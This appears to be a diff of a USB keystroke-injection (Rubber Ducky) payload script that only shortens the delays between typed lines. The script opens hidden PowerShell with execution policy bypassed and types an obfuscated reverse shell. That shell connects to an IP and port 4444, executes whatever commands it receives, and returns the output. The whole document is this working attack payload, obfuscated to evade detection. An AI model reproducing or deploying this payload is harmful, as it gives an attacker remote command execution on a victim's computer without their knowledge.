@@ -15,19 +15,19 @@ STRING powershell -NoP -NonI -W hidden -Exec Bypass
 DELAY 250
 ENTER
 
-DELAY 200
+DELAY 100
 STRING $IP='0.0.0.0';$Port=4444;$client = .('N'+'ew-O'+'bject') sYSteM.neT.soCKETs.TcPCLient
-DELAY 200
+DELAY 100
 STRING ($IP,$Port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|.('%'){0};while(($i = $s
-DELAY 200
+DELAY 100
 STRING tream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (.('Ne'+'w-O'+'bject') -TypeName SystE
-DELAY 200
+DELAY 100
 STRING M.tEXt.aSCiIEnCodinG).GetString($bytes,0, $i);$sendback = (.('i'+'ex') $data 2>&1 | .('Ou
-DELAY 200
+DELAY 100
 STRING t-'+'Str'+'in'+'g') );$sendback2 = $sendback + 'PS ' + (&('p'+'wd')).Path + '> ';$sendbyt
-DELAY 200
+DELAY 100
 STRING e = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Len
-DELAY 200
+DELAY 100
 STRING gth);$stream.Flush()};$client.Close()
 DELAY 100
 ENTER
